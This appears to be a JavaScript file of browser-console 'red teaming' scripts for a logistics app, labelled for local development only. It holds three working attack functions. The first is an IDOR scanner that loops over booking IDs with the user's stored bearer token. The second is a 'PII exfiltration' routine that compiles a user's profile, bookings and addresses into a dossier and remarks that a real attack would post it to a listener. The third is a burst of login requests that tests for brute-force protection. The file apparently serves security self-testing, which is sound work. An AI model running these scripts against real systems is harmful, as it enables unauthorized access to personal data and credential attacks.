/**
 * Advanced Red Teaming Scripts for Logistics App
 * 
 * USE ONLY IN LOCAL DEVELOPMENT. Running these on production may get your IP banned.
 * 
 * Instructions:
 * 1. Ensure you are logged in.
 * 2. Copy the desired script into the Browser Console (F12).
 */

// --- ATTACK 4: IDOR (Insecure Direct Object Reference) SCANNER ---
// Goal: Attempt to access bookings that belong to other users.
async function runIdorScanner(startId, endId) {
    const STORAGE_KEY = 'dara-auth-store';
    const store = JSON.parse(localStorage.getItem(STORAGE_KEY));
    const token = store.state?.token;

    if (!token) {
        console.error("[-] No token found. Please log in.");
        return;
    }

    console.log(`[!] Starting IDOR Scan for IDs ${startId} to ${endId}...`);

    for (let id = startId; id <= endId; id++) {
        try {
            const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/bookings/${id}`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });

            if (response.ok) {
                const data = await response.json();
                console.warn(`[!!!] VULNERABILITY FOUND: Accessed data for ID ${id}!`, data);
            } else if (response.status === 403 || response.status === 401) {
                console.log(`[-] ID ${id}: Access Denied (Correctly Secured)`);
            } else {
                console.log(`[-] ID ${id}: Error ${response.status}`);
            }
        } catch (e) {
            console.error(`[-] ID ${id}: Request failed`);
        }
    }
    console.log("[+] Scan Complete.");
}


// --- ATTACK 5: AUTOMATED PII EXFILTRATION ---
// Goal: Harvest all profile and booking data in one go.
async function exfiltrateUserData() {
    const STORAGE_KEY = 'dara-auth-store';
    const store = JSON.parse(localStorage.getItem(STORAGE_KEY));
    const token = store.state?.token;
    const baseUrl = import.meta.env.VITE_API_BASE_URL;

    if (!token) return;

    try {
        console.log("[!] Starting automated data harvest...");
        
        const [profile, bookings, addresses] = await Promise.all([
            fetch(`${baseUrl}/user`, { headers: { 'Authorization': `Bearer ${token}` } }).then(r => r.json()),
            fetch(`${baseUrl}/bookings/users`, { headers: { 'Authorization': `Bearer ${token}` } }).then(r => r.json()),
            fetch(`${baseUrl}/addresses`, { headers: { 'Authorization': `Bearer ${token}` } }).then(r => r.json())
        ]);

        const dossier = {
            target: profile.user?.email || "Unknown",
            timestamp: new Date().toISOString(),
            profile: profile,
            bookingsCount: bookings.data?.length || 0,
            allBookings: bookings.data,
            savedAddresses: addresses.data
        };

        console.warn("[!] EXFILTRATION COMPLETE. User dossier created:", dossier);
        console.log("[!] In a real attack, this JSON would now be POSTed to a listener server.");
    } catch (e) {
        console.error("[-] Harvest failed:", e);
    }
}


// --- ATTACK 6: RATE-LIMIT (BRUTE FORCE) SIMULATOR ---
// Goal: Test if the server blocks rapid-fire requests.
async function testRateLimit(count = 50) {
    const baseUrl = import.meta.env.VITE_API_BASE_URL;
    console.log(`[!] Launching ${count} requests in 1 second to test rate limiting...`);

    const requests = Array.from({ length: count }).map((_, i) => 
        fetch(`${baseUrl}/auth/login`, {
            method: 'POST',
            body: JSON.stringify({ email: 'test@attack.com', password: 'wrong' }),
            headers: { 'Content-Type': 'application/json' }
        }).then(r => ({ id: i, status: r.status }))
    );

    const results = await Promise.all(requests);
    const blocked = results.filter(r => r.status === 429).length;

    if (blocked > 0) {
        console.log(`[+] PROTECTION DETECTED: ${blocked}/${count} requests were rate-limited (429).`);
    } else {
        console.error(`[!] VULNERABILITY: 0/${count} requests were blocked. Server might be vulnerable to brute force.`);
    }
}
